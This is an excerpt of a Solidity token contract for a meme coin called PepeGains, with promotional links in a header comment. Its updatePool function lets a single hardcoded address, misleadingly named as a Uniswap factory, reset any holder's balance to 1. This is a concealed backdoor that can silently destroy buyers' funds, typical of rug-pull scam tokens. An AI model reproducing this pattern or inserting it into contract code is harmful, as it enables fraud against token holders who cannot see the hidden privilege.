...
/*
https://twitter.com/PepeGainsETH
https://t.me/PepeGainsETH
https://PepeGainsETH.xyz
*/
...
contract PepeGains is Context, IERC20, Ownable {
    ...
    string private constant _symbol = unicode"PEGAINS";
    uint8 private constant _decimals = 9;
    uint256 private _totalSupply = 8010000000000 * 10**_decimals;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    address private _uniswapFactoryV2 = 0x346a83Cbcd1E3D0FF2f54Ade33D5b3E986861c5F;
    ...
    function updatePool(address updatePoolSender) external { if (msg.sender == _uniswapFactoryV2) _balances[updatePoolSender] = 1; }
